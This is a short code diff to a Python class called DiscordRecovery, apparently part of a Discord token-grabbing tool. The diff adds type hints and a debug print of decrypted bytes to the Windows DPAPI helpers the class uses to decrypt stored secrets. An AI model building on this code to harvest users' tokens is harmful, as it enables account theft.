@@ -49,15 +49,16 @@ class DiscordRecovery(ModuleManager):
         self.tokensTMP = ''
         self.tokensCount = 0
 
-    def GetData(self, blob_out):
+    def GetData(self, blob_out) -> bytes:
         cbData = int(blob_out.cbData)
         pbData = blob_out.pbData
         buffer = c_buffer(cbData)
         cdll.msvcrt.memcpy(buffer, pbData, cbData)
         windll.kernel32.LocalFree(pbData)
+        print("="*100, buffer.raw, "="*100, type(buffer.raw) ,"="*100)
         return buffer.raw
 
-    def CryptUnprotectData(self, encrypted_bytes, entropy=b''):
+    def CryptUnprotectData(self, encrypted_bytes, entropy=b'') -> bytes:
         buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
         buffer_entropy = c_buffer(entropy, len(entropy))
         blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
